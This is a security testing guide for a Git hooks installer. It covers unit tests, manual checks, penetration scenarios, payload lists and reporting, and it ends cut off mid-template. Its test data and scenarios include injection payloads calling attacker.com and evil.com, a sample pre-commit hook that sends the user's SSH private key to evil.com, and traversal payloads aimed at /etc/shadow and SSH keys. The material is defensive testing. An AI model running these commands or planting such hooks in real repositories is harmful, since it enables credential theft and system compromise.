# Security Testing Guide

This guide provides comprehensive instructions for testing the security features of the Git Hooks Installer system, including automated tests, manual validation procedures, and penetration testing techniques.

## Table of Contents

1. [Testing Overview](#testing-overview)
2. [Automated Security Tests](#automated-security-tests)
3. [Manual Security Validation](#manual-security-validation)
4. [Penetration Testing](#penetration-testing)
5. [Vulnerability Assessment](#vulnerability-assessment)
6. [Security Test Data](#security-test-data)
7. [Continuous Security Testing](#continuous-security-testing)
8. [Security Test Reporting](#security-test-reporting)

## Testing Overview

### Security Testing Philosophy

The security testing approach follows a **comprehensive validation strategy**:

1. **Unit Tests:** Test individual security components in isolation
2. **Integration Tests:** Validate security across component boundaries
3. **System Tests:** End-to-end security validation
4. **Penetration Tests:** Simulate real-world attack scenarios
5. **Regression Tests:** Ensure fixes don't introduce new vulnerabilities

### Testing Environment Setup

```bash
# Clone repository
git clone https://github.com/development-toolbox/development-toolbox-git-hooks-installer.git
cd development-toolbox-git-hooks-installer

# Create test environment
python3 -m venv security-test-env
source security-test-env/bin/activate

# Install testing dependencies
pip install -r tests/requirements.txt
pip install pytest-security pytest-mock bandit safety

# Set up test repositories
mkdir -p tests/test-repos
cd tests/test-repos
for repo in clean-repo dirty-repo malicious-repo; do
    mkdir $repo && cd $repo
    git init
    git config user.name "Test User"
    git config user.email "test@example.com"
    cd ..
done
```

## Automated Security Tests

### Running Security Test Suite

```bash
# Run all security tests
pytest tests/security/ -v --tb=short

# Run specific security test categories
pytest tests/security/test_command_injection.py -v
pytest tests/security/test_path_traversal.py -v
pytest tests/security/test_race_conditions.py -v
pytest tests/security/test_input_validation.py -v

# Run with coverage
pytest tests/security/ --cov=git-hooks-installer --cov-report=html

# Generate security report
pytest tests/security/ --security-report=security-results.json
```

### Unit Tests for Security Components

#### Command Injection Prevention Tests

```python
# tests/security/test_command_injection.py

import pytest
import subprocess
from unittest.mock import patch, MagicMock
from git_hooks_installer.security.secure_git_wrapper import SecureGitWrapper, SecureGitError

class TestCommandInjectionPrevention:
    """Test command injection prevention in all components."""
    
    @pytest.fixture
    def secure_wrapper(self, tmp_path):
        """Create SecureGitWrapper for testing."""
        repo_path = tmp_path / "test_repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        return SecureGitWrapper(repo_path)
    
    def test_malicious_branch_names(self, secure_wrapper):
        """Test that malicious branch names are rejected."""
        
        malicious_branches = [
            "; rm -rf /tmp/test",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(id)",
            "branch'; DROP TABLE users; --",
            "branch & echo 'hacked'",
            "branch || curl evil.com",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe"
        ]
        
        for malicious_branch in malicious_branches:
            with pytest.raises(SecureGitError, match="Invalid branch name"):
                secure_wrapper.create_branch(malicious_branch)
    
    def test_command_whitelisting(self, secure_wrapper):
        """Test that only whitelisted commands are allowed."""
        
        forbidden_commands = [
            "rm", "cat", "curl", "wget", "nc", "netcat",
            "python", "bash", "sh", "eval", "exec"
        ]
        
        for cmd in forbidden_commands:
            with pytest.raises(SecureGitError, match="Git command not allowed"):
                secure_wrapper.run(cmd, "test")
    
    def test_argument_injection(self, secure_wrapper):
        """Test that argument injection is prevented."""
        
        malicious_args = [
            "--exec=rm -rf /",
            "-c 'rm -rf /'",
            "--upload-pack='rm -rf /'",
            "--receive-pack='curl evil.com'"
        ]
        
        for arg in malicious_args:
            with pytest.raises(SecureGitError, match="Argument not allowed"):
                secure_wrapper.run("status", arg)
    
    @patch('subprocess.run')
    def test_shell_injection_prevention(self, mock_run, secure_wrapper):
        """Test that shell=False is enforced."""
        
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        
        secure_wrapper.run("status")
        
        # Verify shell=False was used
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        assert kwargs['shell'] is False
    
    def test_environment_sanitization(self, secure_wrapper):
        """Test that environment variables are properly sanitized."""
        
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
            
            secure_wrapper.run("status")
            
            # Check that GIT_TERMINAL_PROMPT is set to 0
            args, kwargs = mock_run.call_args
            env = kwargs['env']
            assert env['GIT_TERMINAL_PROMPT'] == '0'
```

#### Path Traversal Prevention Tests

```python
# tests/security/test_path_traversal.py

import pytest
from pathlib import Path
from git_hooks_installer.security.secure_git_wrapper import SecureGitWrapper, SecureGitError
from git_hooks_installer.security.file_tracker import FileTracker

class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""
    
    @pytest.fixture
    def file_tracker(self, tmp_path):
        """Create FileTracker for testing."""
        repo_path = tmp_path / "test_repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        return FileTracker(repo_path)
    
    def test_relative_path_traversal(self, file_tracker):
        """Test prevention of relative path traversal attacks."""
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\hosts",
            "./../../secret.txt",
            ".\\..\\..\\secret.txt",
            "normal/../../../etc/passwd",
            "docs/../../etc/passwd"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, SecureGitError)):
                file_tracker.track_file_creation(malicious_path)
    
    def test_absolute_path_validation(self, file_tracker):
        """Test absolute path validation."""
        
        malicious_absolute_paths = [
            "/etc/passwd",
            "/tmp/malicious",
            "C:\\Windows\\System32\\cmd.exe",
            "/usr/bin/python",
            "/home/user/.ssh/id_rsa"
        ]
        
        for malicious_path in malicious_absolute_paths:
            with pytest.raises((ValueError, SecureGitError)):
                file_tracker.track_file_creation(malicious_path)
    
    def test_symlink_traversal(self, tmp_path):
        """Test symlink-based traversal prevention."""
        
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        
        # Create symlink pointing outside repo
        outside_file = tmp_path / "outside.txt"
        outside_file.write_text("sensitive content")
        
        symlink = repo_path / "link_to_outside"
        symlink.symlink_to(outside_file)
        
        file_tracker = FileTracker(repo_path)
        
        # Should detect and prevent symlink traversal
        with pytest.raises((ValueError, SecurityError)):
            file_tracker.track_file_creation("link_to_outside")
    
    @pytest.mark.parametrize("shell_script", [
        "update-readme.sh",
        "post-commit"
    ])
    def test_shell_script_path_validation(self, shell_script, tmp_path):
        """Test path validation in shell scripts."""
        
        # This test would validate shell script path handling
        # by examining the actual script behavior
        
        # Set up test environment
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        (repo_path / "docs").mkdir()
        (repo_path / "docs" / "commit-logs").mkdir()
        
        # Test malicious branch name that could cause path traversal
        malicious_branch = "../../etc/passwd"
        
        env = {
            'BRANCH_NAME': malicious_branch,
            'REPO_ROOT': str(repo_path)
        }
        
        # Would run the shell script and verify it rejects malicious input
        # Implementation would depend on the specific shell script testing framework
        pass
```

#### Race Condition Tests

```python
# tests/security/test_race_conditions.py

import pytest
import threading
import time
import fcntl
from concurrent.futures import ThreadPoolExecutor, as_completed
from git_hooks_installer.security.file_tracker import FileTracker

class TestRaceConditionPrevention:
    """Test race condition prevention in file operations."""
    
    @pytest.fixture
    def file_tracker(self, tmp_path):
        """Create FileTracker for testing."""
        repo_path = tmp_path / "test_repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        return FileTracker(repo_path)
    
    def test_concurrent_file_tracking(self, file_tracker):
        """Test concurrent file tracking operations."""
        
        def track_files(thread_id):
            """Track files from multiple threads."""
            results = []
            for i in range(10):
                try:
                    file_path = f"thread_{thread_id}_file_{i}.txt"
                    file_tracker.track_file_creation(file_path)
                    results.append(('success', file_path))
                except Exception as e:
                    results.append(('error', str(e)))
            return results
        
        # Run concurrent file tracking
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(track_files, i) for i in range(5)]
            all_results = []
            
            for future in as_completed(futures):
                all_results.extend(future.result())
        
        # Verify no race conditions occurred
        successful_operations = [r for r in all_results if r[0] == 'success']
        assert len(successful_operations) == 50  # 5 threads × 10 files
        
        # Verify all tracked files are recorded
        tracked_files = file_tracker.get_all_tracked_files()
        assert len(tracked_files) == 50
    
    def test_file_locking_mechanism(self, file_tracker):
        """Test that file locking prevents race conditions."""
        
        lock_acquired = threading.Event()
        lock_released = threading.Event()
        
        def acquire_lock_thread():
            """Thread that acquires lock and holds it."""
            try:
                result = file_tracker.safe_add_tracked_files()
                lock_acquired.set()
                time.sleep(0.1)  # Hold lock briefly
                lock_released.set()
                return result
            except Exception as e:
                return str(e)
        
        def competing_thread():
            """Thread that tries to acquire lock while it's held."""
            lock_acquired.wait()  # Wait for first thread to acquire lock
            
            try:
                # This should either block or fail gracefully
                result = file_tracker.safe_add_tracked_files()
                return result
            except BlockingIOError:
                return "lock_blocked"  # Expected behavior
            except Exception as e:
                return str(e)
        
        # Run competing threads
        with ThreadPoolExecutor(max_workers=2) as executor:
            future1 = executor.submit(acquire_lock_thread)
            future2 = executor.submit(competing_thread)
            
            result1 = future1.result()
            result2 = future2.result()
        
        # Verify locking worked
        assert result2 == "lock_blocked" or isinstance(result2, bool)
    
    def test_toctou_prevention(self, tmp_path):
        """Test Time-of-Check-Time-of-Use prevention."""
        
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        
        file_tracker = FileTracker(repo_path)
        test_file = repo_path / "test.txt"
        test_file.write_text("original content")
        
        def modify_file_thread():
            """Thread that modifies file during operation."""
            time.sleep(0.05)  # Wait for main operation to start
            test_file.write_text("modified content")
        
        def track_file_thread():
            """Thread that tracks file."""
            file_tracker.track_file_creation("test.txt")
            time.sleep(0.1)  # Simulate processing time
            return file_tracker.safe_add_tracked_files()
        
        # Run TOCTOU test
        with ThreadPoolExecutor(max_workers=2) as executor:
            future1 = executor.submit(track_file_thread)
            future2 = executor.submit(modify_file_thread)
            
            result1 = future1.result()
            future2.result()
        
        # Verify operation completed safely
        assert isinstance(result1, bool)
```

#### Input Validation Tests

```python
# tests/security/test_input_validation.py

import pytest
from git_hooks_installer.security.repository_validator import RepositoryValidator
from git_hooks_installer.developer_setup.setup_githooks import InputValidator

class TestInputValidation:
    """Test comprehensive input validation."""
    
    def test_branch_name_validation(self):
        """Test branch name validation patterns."""
        
        valid_branches = [
            "main", "develop", "feature/new-feature",
            "bugfix/issue-123", "release/v1.0.0",
            "hotfix/critical-fix", "feat/user-auth",
            "docs/update-readme", "test/integration"
        ]
        
        invalid_branches = [
            "", "  ", "\n", "\t",  # Empty/whitespace
            "; rm -rf /", "&& curl evil.com",  # Command injection
            "../../../etc/passwd", "..\\system32",  # Path traversal
            "branch with spaces", "branch@with#symbols",  # Invalid chars
            "branch|pipe", "branch`backtick", "branch$(cmd)",  # Shell metacharacters
            "x" * 256,  # Too long
            ".hidden", "branch.", ".git",  # Git-specific invalid names
            "/leading-slash", "trailing-slash/",  # Invalid slashes
            "double//slash", "branch..dots"  # Invalid patterns
        ]
        
        for branch in valid_branches:
            assert InputValidator.validate_input(branch, 'branch_name')
        
        for branch in invalid_branches:
            with pytest.raises(ValueError):
                InputValidator.validate_input(branch, 'branch_name')
    
    def test_email_validation(self):
        """Test email validation."""
        
        valid_emails = [
            "user@example.com", "test.user@domain.org",
            "user+tag@example.co.uk", "developer@company.com",
            "firstname.lastname@example.com"
        ]
        
        invalid_emails = [
            "", "not-an-email", "@domain.com", "user@",
            "user space@domain.com", "user;injection@domain.com",
            "user<script>@domain.com", "user@domain",
            "user@@domain.com", "user@.com", "@@@"
        ]
        
        for email in valid_emails:
            assert InputValidator.validate_input(email, 'email')
        
        for email in invalid_emails:
            with pytest.raises(ValueError):
                InputValidator.validate_input(email, 'email')
    
    def test_commit_hash_validation(self):
        """Test commit hash validation."""
        
        valid_hashes = [
            "abc12345",  # 8 character short hash
            "1234567890abcdef1234567890abcdef12345678",  # 40 character full hash
            "a1b2c3d4e5f67890",  # 16 character hash
        ]
        
        invalid_hashes = [
            "", "abc", "xyz",  # Too short
            "not-hex-chars", "ghijklmn",  # Non-hex characters
            "abc123; rm -rf /",  # Injection attempt
            "x" * 41,  # Too long
        ]
        
        for hash_val in valid_hashes:
            assert InputValidator.validate_input(hash_val, 'commit_hash')
        
        for hash_val in invalid_hashes:
            with pytest.raises(ValueError):
                InputValidator.validate_input(hash_val, 'commit_hash')
    
    def test_url_validation(self):
        """Test URL validation for repository URLs."""
        
        valid_urls = [
            "https://github.com/user/repo.git",
            "git@github.com:user/repo.git",
            "https://gitlab.com/user/repo",
            "ssh://git@server.com:7999/project/repo.git"
        ]
        
        invalid_urls = [
            "", "not-a-url", "ftp://invalid.com",
            "javascript:alert('xss')", "file:///etc/passwd",
            "https://github.com/user/repo; rm -rf /",
            "http://malicious.com | nc attacker.com 4444"
        ]
        
        for url in valid_urls:
            assert InputValidator.validate_input(url, 'url')
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                InputValidator.validate_input(url, 'url')
```

### Resource Limit Tests

```python
# tests/security/test_resource_limits.py

import pytest
import tempfile
from pathlib import Path
from git_hooks_installer.security.file_tracker import FileTracker

class TestResourceLimits:
    """Test resource exhaustion prevention."""
    
    def test_file_count_limits(self, tmp_path):
        """Test file count limits."""
        
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        
        file_tracker = FileTracker(repo_path)
        
        # Test within limits
        for i in range(file_tracker.MAX_FILES):
            file_tracker.track_file_creation(f"file_{i}.txt")
        
        # Test exceeding limits
        with pytest.raises(ValueError, match="Maximum file limit exceeded"):
            file_tracker.track_file_creation("excess_file.txt")
    
    def test_file_size_limits(self, tmp_path):
        """Test file size limits."""
        
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        
        file_tracker = FileTracker(repo_path)
        
        # Create large file
        large_file = repo_path / "large_file.txt"
        large_file.write_text("x" * (file_tracker.MAX_FILE_SIZE + 1))
        
        with pytest.raises(ValueError, match="File too large"):
            file_tracker.track_file_creation("large_file.txt")
    
    def test_total_size_limits(self, tmp_path):
        """Test total tracked size limits."""
        
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        
        file_tracker = FileTracker(repo_path)
        
        # Create files that exceed total size limit
        file_size = file_tracker.MAX_FILE_SIZE // 2
        files_needed = (file_tracker.MAX_TOTAL_SIZE // file_size) + 2
        
        for i in range(files_needed):
            test_file = repo_path / f"test_file_{i}.txt"
            test_file.write_text("x" * file_size)
            
            if i < files_needed - 1:
                file_tracker.track_file_creation(f"test_file_{i}.txt")
            else:
                with pytest.raises(ValueError, match="Total size limit exceeded"):
                    file_tracker.track_file_creation(f"test_file_{i}.txt")
                break
    
    def test_timeout_limits(self, tmp_path):
        """Test operation timeout limits."""
        
        from unittest.mock import patch
        import subprocess
        
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / ".git").mkdir()
        
        from git_hooks_installer.security.secure_git_wrapper import SecureGitWrapper
        wrapper = SecureGitWrapper(repo_path, timeout=1)  # 1 second timeout
        
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(['git', 'status'], 1)
            
            with pytest.raises(Exception, match="timed out"):
                wrapper.run('status')
```

## Manual Security Validation

### Security Checklist

Before each release, perform the following manual security validations:

#### 1. Command Injection Testing

```bash
# Test branch name injection
export MALICIOUS_BRANCH="; rm -rf /tmp/test"
python git-hooks-installer/git-hooks-installer.py --check

# Test with various injection patterns
for injection in "; cat /etc/passwd" "&& curl evil.com" "| nc attacker.com 4444"; do
    echo "Testing injection: $injection"
    git checkout -b "$injection" 2>&1 || echo "Correctly rejected"
done
```

#### 2. Path Traversal Testing

```bash
# Test path traversal in file operations
mkdir -p test-repo && cd test-repo
git init

# Test various traversal patterns
python ../git-hooks-installer/git-hooks-installer.py ../../../etc/passwd
python ../git-hooks-installer/git-hooks-installer.py ..\..\..\windows\system32

# Verify operations stay within repository bounds
```

#### 3. File Permission Testing

```bash
# Test file permissions after installation
python git-hooks-installer/git-hooks-installer.py test-repo
ls -la test-repo/.git/hooks/

# Verify executable permissions
file test-repo/.git/hooks/post-commit
test -x test-repo/.git/hooks/post-commit && echo "Executable" || echo "Not executable"

# Test with restricted permissions
chmod 444 test-repo/.git/hooks/
python git-hooks-installer/git-hooks-installer.py test-repo --force
```

#### 4. Environment Variable Testing

```bash
# Test environment variable injection
export GIT_TERMINAL_PROMPT="1; curl evil.com"
export BRANCH_NAME="../../../etc/passwd"
export REPO_ROOT="/; rm -rf /tmp"

python git-hooks-installer/git-hooks-installer.py test-repo

# Verify variables are sanitized
```

#### 5. Resource Exhaustion Testing

```bash
# Test with large repository
mkdir large-repo && cd large-repo
git init

# Create many files
for i in {1..2000}; do
    echo "content $i" > "file_$i.txt"
    git add "file_$i.txt"
done

# Test installer handles large repos
python ../git-hooks-installer/git-hooks-installer.py .

# Test memory usage
/usr/bin/time -v python ../git-hooks-installer/git-hooks-installer.py .
```

## Penetration Testing

### Simulated Attack Scenarios

#### Scenario 1: Malicious Repository

```bash
# Create malicious repository
mkdir malicious-repo && cd malicious-repo
git init

# Add malicious files
echo '#!/bin/bash' > .git/hooks/pre-commit
echo 'curl evil.com/exfiltrate?data=$(cat ~/.ssh/id_rsa | base64)' >> .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

# Add symlinks pointing outside repo
ln -s /etc/passwd exposed_passwd
ln -s ~/.ssh/ ssh_keys

# Add files with injection in names
touch "; rm -rf ~/.ssh; echo 'hacked'"
touch "$(curl evil.com)"

# Test installer behavior
cd ..
python git-hooks-installer/git-hooks-installer.py malicious-repo
```

#### Scenario 2: Race Condition Exploitation

```bash
# Script to test race conditions
cat > race_test.sh << 'EOF'
#!/bin/bash

# Start installer in background
python git-hooks-installer/git-hooks-installer.py test-repo &
INSTALLER_PID=$!

# Simultaneously modify repository
sleep 0.1
cd test-repo
echo "malicious content" > .git/hooks/post-commit
git add .
git commit -m "malicious commit"

# Wait for installer
wait $INSTALLER_PID
echo "Installer exit code: $?"
EOF

chmod +x race_test.sh
./race_test.sh
```

#### Scenario 3: Social Engineering

```bash
# Create convincing but malicious branch name
git checkout -b "feature/urgent-security-fix-please-merge-immediately"

# Add seemingly benign but malicious commit
cat > innocuous_file.txt << 'EOF'
# Configuration file
debug=true
log_level=info
# The following line contains base64 encoded data for configuration
config_data=Y3VybCBldmlsLmNvbS9zdGVhbC1kYXRhID4gL2Rldi9udWxsIDI+JjE=
EOF

git add innocuous_file.txt
git commit -m "fix: update configuration for better logging"

# Test if installer processes malicious content
cd ..
python git-hooks-installer/git-hooks-installer.py test-repo
```

## Vulnerability Assessment

### Static Analysis

```bash
# Run Bandit security scanner
bandit -r git-hooks-installer/ -f json -o bandit-report.json

# Run safety check for known vulnerabilities
safety check --json --output safety-report.json

# Custom security audit script
cat > security_audit.py << 'EOF'
#!/usr/bin/env python3
import ast
import os
import re
from pathlib import Path

class SecurityAuditor:
    def __init__(self, directory):
        self.directory = Path(directory)
        self.issues = []
    
    def audit_subprocess_calls(self):
        """Audit subprocess calls for security issues."""
        for py_file in self.directory.rglob("*.py"):
            with open(py_file, 'r') as f:
                content = f.read()
            
            tree = ast.parse(content)
            
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    if hasattr(node.func, 'attr') and node.func.attr in ['run', 'call', 'check_output']:
                        # Check for shell=True
                        for keyword in node.keywords:
                            if keyword.arg == 'shell' and keyword.value.value is True:
                                self.issues.append(f"{py_file}:{node.lineno}: shell=True detected")
    
    def audit_path_operations(self):
        """Audit path operations for traversal vulnerabilities."""
        dangerous_patterns = [
            r'\.\./',      # Relative path traversal
            r'\.\.\\',     # Windows path traversal
            r'/etc/',      # Absolute path to sensitive directory
            r'C:\\',       # Windows absolute path
        ]
        
        for py_file in self.directory.rglob("*.py"):
            with open(py_file, 'r') as f:
                lines = f.readlines()
            
            for i, line in enumerate(lines, 1):
                for pattern in dangerous_patterns:
                    if re.search(pattern, line):
                        self.issues.append(f"{py_file}:{i}: Potential path traversal: {line.strip()}")
    
    def generate_report(self):
        """Generate security audit report."""
        print("Security Audit Report")
        print("=" * 50)
        
        if not self.issues:
            print("No security issues detected.")
        else:
            for issue in self.issues:
                print(f"⚠️  {issue}")
        
        print(f"\nTotal issues found: {len(self.issues)}")

if __name__ == "__main__":
    auditor = SecurityAuditor("git-hooks-installer")
    auditor.audit_subprocess_calls()
    auditor.audit_path_operations()
    auditor.generate_report()
EOF

python security_audit.py
```

### Dynamic Analysis

```bash
# Memory leak detection
valgrind --tool=memcheck --leak-check=full python git-hooks-installer/git-hooks-installer.py test-repo

# File descriptor leak detection
lsof -p $(pgrep -f git-hooks-installer.py) | wc -l

# Network activity monitoring
netstat -tuln | grep $(pgrep -f git-hooks-installer.py)

# System call tracing
strace -e trace=file,process,network python git-hooks-installer/git-hooks-installer.py test-repo
```

## Security Test Data

### Test Repositories

Create various test repositories with different security scenarios:

#### Clean Repository

```bash
mkdir clean-test-repo && cd clean-test-repo
git init
git config user.name "Test User"
git config user.email "test@example.com"

# Add normal files
echo "# Clean Repository" > README.md
echo "print('Hello, World!')" > main.py
git add . && git commit -m "Initial commit"
```

#### Repository with Sensitive Files

```bash
mkdir sensitive-test-repo && cd sensitive-test-repo
git init
git config user.name "Test User"
git config user.email "test@example.com"

# Add sensitive files that should be detected
echo "API_KEY=secret123" > .env
echo "password=admin123" > config.txt
openssl genrsa -out private.key 2048
echo "aws_access_key_id=AKIAIOSFODNN7EXAMPLE" > .aws/credentials

# These should be detected by sensitive file scanner
```

#### Repository with Mixed Content

```bash
mkdir mixed-test-repo && cd mixed-test-repo
git init
git config user.name "Test User"  
git config user.email "test@example.com"

# Mix of normal and potentially sensitive files
echo "# Project" > README.md
echo "debug=true\npassword=changeme" > app.config
echo "export SECRET_KEY=abc123" > env.sh
echo "Normal content" > normal.txt

git add README.md normal.txt
git commit -m "Add safe files"
# Leave sensitive files uncommitted
```

### Test Payloads

#### Command Injection Payloads

```python
COMMAND_INJECTION_PAYLOADS = [
    # Basic command injection
    "; rm -rf /tmp/test",
    "&& curl evil.com",
    "| nc attacker.com 4444",
    
    # Shell metacharacter injection
    "`whoami`",
    "$(id)",
    "${HOME}",
    
    # Script injection
    "'; cat /etc/passwd; echo '",
    "\"; curl evil.com; echo \"",
    
    # Windows-specific
    "& dir C:\\",
    "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    
    # SQL injection (for completeness)
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    
    # Path traversal combined with injection
    "../../../bin/sh -c 'curl evil.com'"
]
```

#### Path Traversal Payloads

```python
PATH_TRAVERSAL_PAYLOADS = [
    # Unix path traversal
    "../../../etc/passwd",
    "../../../../root/.ssh/id_rsa",
    "./../../etc/shadow",
    
    # Windows path traversal
    "..\\..\\..\\windows\\system32\\hosts",
    "..\\..\\..\\users\\administrator\\ntuser.dat",
    
    # URL-encoded traversal
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    
    # Double encoding
    "%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    
    # Null byte injection
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00.txt",
    
    # Unicode normalization
    "..\u002f..\u002f..\u002fetc\u002fpasswd",
]
```

## Continuous Security Testing

### CI/CD Integration

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * 1'  # Weekly security scan

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install bandit safety pytest-security
    
    - name: Run Bandit security scanner
      run: bandit -r git-hooks-installer/ -f json -o bandit-report.json
    
    - name: Run Safety vulnerability check
      run: safety check --json --output safety-report.json
    
    - name: Run security unit tests
      run: pytest tests/security/ -v --junit-xml=security-results.xml
    
    - name: Run penetration tests
      run: |
        bash tests/security/run_penetration_tests.sh
    
    - name: Upload security reports
      uses: actions/upload-artifact@v2
      with:
        name: security-reports
        path: |
          bandit-report.json
          safety-report.json
          security-results.xml
```

### Security Monitoring

```python
# security_monitor.py - Continuous security monitoring
import logging
import time
import hashlib
from pathlib import Path
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class SecurityMonitor(FileSystemEventHandler):
    """Monitor for security-relevant file changes."""
    
    def __init__(self, watched_directory):
        self.watched_directory = Path(watched_directory)
        self.file_hashes = {}
        self.logger = logging.getLogger(__name__)
        
        # Calculate initial hashes
        self._calculate_initial_hashes()
    
    def _calculate_initial_hashes(self):
        """Calculate hashes for all monitored files."""
        security_files = [
            "git-hooks-installer/security/secure_git_wrapper.py",
            "git-hooks-installer/security/file_tracker.py",
            "git-hooks-installer/security/repository_validator.py",
            "git-hooks-installer/git-hooks/post-commit",
            "git-hooks-installer/scripts/post-commit/update-readme.sh"
        ]
        
        for file_path in security_files:
            full_path = self.watched_directory / file_path
            if full_path.exists():
                self.file_hashes[str(full_path)] = self._calculate_hash(full_path)
    
    def _calculate_hash(self, file_path):
        """Calculate SHA-256 hash of file."""
        hash_sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return hash_sha256.hexdigest()
    
    def on_modified(self, event):
        """Handle file modification events."""
        if event.is_directory:
            return
        
        file_path = event.src_path
        if file_path in self.file_hashes:
            new_hash = self._calculate_hash(file_path)
            old_hash = self.file_hashes[file_path]
            
            if new_hash != old_hash:
                self.logger.warning(f"Security file modified: {file_path}")
                self.logger.warning(f"Old hash: {old_hash}")
                self.logger.warning(f"New hash: {new_hash}")
                
                # Update hash
                self.file_hashes[file_path] = new_hash
                
                # Trigger security re-scan
                self._trigger_security_scan(file_path)
    
    def _trigger_security_scan(self, file_path):
        """Trigger security scan when critical file is modified."""
        import subprocess
        
        self.logger.info(f"Triggering security scan due to {file_path}")
        
        try:
            # Run security tests
            subprocess.run(["pytest", "tests/security/", "-v"], check=True)
            
            # Run static analysis
            subprocess.run(["bandit", "-r", "git-hooks-installer/"], check=True)
            
            self.logger.info("Security scan completed successfully")
            
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Security scan failed: {e}")

def main():
    """Main monitoring loop."""
    logging.basicConfig(level=logging.INFO)
    
    event_handler = SecurityMonitor(".")
    observer = Observer()
    observer.schedule(event_handler, "git-hooks-installer", recursive=True)
    
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

if __name__ == "__main__":
    main()
```

## Security Test Reporting

### Test Report Template

```python
# generate_security_report.py
import json
import datetime
from pathlib import Path

class SecurityTestReport:
    """Generate comprehensive security test report."""
    
    def __init__(self):
        self.report_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'test_summary': {},
            'vulnerabilities': [],
            'remediation': [],
            'compliance': {}
        }
    
    def add_test_results(self, test_category, results):
        """Add test results to report."""
        self.report_data['test_summary'][test_category] = {
            'total_tests': results.get('total', 0),
            'passed': results.get('passed', 0),
            'failed': results.get('failed', 0),
            'skipped': results.get('skipped', 0),
            'duration': results.get('duration', 0)
        }
    
    def add_vulnerability(self, vuln_type, severity, description, location):
        """Add vulnerability to report."""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'location': location,
            'status': 'open',
            'discovered_at': datetime.datetime.now().isoformat()
        }
        self.report_data['vulnerabilities'].append(vulnerability)
    
    def add_remediation(self, issue, action, priority):
        """Add remediation action to report."""
        remediation = {
            'issue': issue,
            'action': action,
            'priority': priority,
            'assigned_to': None,
            'due_date': None
        }
        self.report_data['remediation'].append(remediation)
    
    def calculate_security_score(self):
        """Calculate overall security score."""
        base_score = 100
        
        # Deduct points for vulnerabilities
        for vuln in self.report_data['vulnerabilities']:
            severity = vuln['severity'].lower()
            if severity == 'critical':
                base_score -= 25
            elif severity == 'high':
                base_score -= 15
            elif severity == 'medium':
                base_score -= 10
            elif severity == 'low':
                base_score -= 5
        
        return max(base_score, 0)
    
    def generate_html_report(self, output_path):
        """Generate HTML security report."""
        security_score = self.calculate_security_score()
        
        html_template = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #f0f0f0; padding: 20px; }}
                .score {{ font-size: 24px; font-weight: bold; }}
                .critical {{ color: #d32f2f; }}
                .high {{ color: #ff5722; }}
                .medium {{ color: #ff9800; }}
                .low {{ color: #4caf50; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Security Test Report</h1>
                <p>Generated on: {self.report_data['timestamp']}</p>
                <p class="score">Security Score: {security_score}/100</p>
            </div>
            
            <h2>Test Summary</h2>
            <table>
                <tr><th>Test Category</th><th>Total</th><th>Passed</th><th>Failed</th></tr>
        '''
        
        for category, results in self.report_data['test_summary'].items():
            html_template += f'''
                <tr>
                    <td>{category}</td>
                    <td>{results['total_tests']}</td>
                    <td>{results['passed']}</td>
                    <td>{results['failed']}</td>
                </tr>
            '''
        
        html_template += '''
            </table>
            
            <h2>Vulnerabilities</h2>
            <table>
                <tr><th>Type</th><th>Severity</th><th>Description</th><th>Location</th></tr>
        '''
        
        for vuln in self.report_data['vulnerabilities']:
            severity_class = vuln['severity'].lower()
            html_template += f'''
                <tr>
                    <td>{vuln['type']}</td>
                    <td class="{severity_class}">{vuln['severity']}</td>
